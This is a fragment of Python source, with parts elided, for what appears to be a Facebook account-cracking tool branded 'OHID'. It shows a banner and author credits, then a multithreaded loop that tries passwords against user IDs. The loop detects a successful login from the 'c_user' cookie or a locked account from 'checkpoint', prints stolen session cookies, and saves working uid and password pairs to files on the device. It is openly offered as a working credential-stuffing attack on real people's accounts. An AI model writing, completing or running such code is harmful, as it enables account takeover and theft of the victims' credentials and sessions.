...
ha = current.day
today = date.today()
#os.system('xdg-open https://www.youtube.com/@ohid_yt')
logo = ("""


\033[1;37m[\033[1;32m______        _   _        _   _       ______                 
|  _  \      | \ | |      | | | |      | ___ \                
...
\033[1;37m[\033[1;32m   \033[1;32m]
---------------------------------------------------
AUTHOR    : Zidan Mahamud 
FACEBOOK  : Zidan Mahamud 
TYPE TYPE : FREE 
VERSION   : 1.4 3.0
---------------------------------------------------""")
def linex():
...
def clear():
    os.system('clear')
    #os.system('xdg-open https://youtube.com/@user-py3cc9nq8p?si=F1Xcb2rYJrDjXgjE')
    print(logo)
...
def riddu():
    ...
    with ThreadPool(max_workers=50) as morshed:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m OHID')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[OHID-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/OHID-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m [OHID-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/OHID-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
